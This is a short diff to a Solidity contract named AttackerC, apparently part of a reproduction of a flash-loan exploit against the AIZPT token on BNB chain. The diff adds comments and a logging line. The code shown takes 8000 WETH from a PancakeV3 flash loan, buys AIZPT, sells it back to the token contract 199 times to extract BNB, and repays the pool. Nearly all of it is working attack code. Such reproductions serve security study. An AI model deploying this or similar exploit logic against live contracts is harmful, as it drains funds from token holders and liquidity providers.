@@ -45,12 +45,12 @@ contract AttackerC {
     function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
         IFS(weth).withdraw(8000 ether);
 
-        AIZPT.call{value: 8000 ether}("");
+        AIZPT.call{value: 8000 ether}("");//buy AIZPT
 
-        for (uint256 i; i < 199; ++i) {
+        for (uint256 i; i < 199; ++i) {//sell AIZPT in loop
             IERC20(AIZPT).transfer(AIZPT, 3_837_275 ether);
         }
-
+        console2.log("BNB balance %d ether", address(this).balance/1e18);
         IFS(weth).deposit{value: address(this).balance}();
 
         IERC20(weth).transfer(PancakeV3Pool, 8_004_100_000_000_000_000_000);
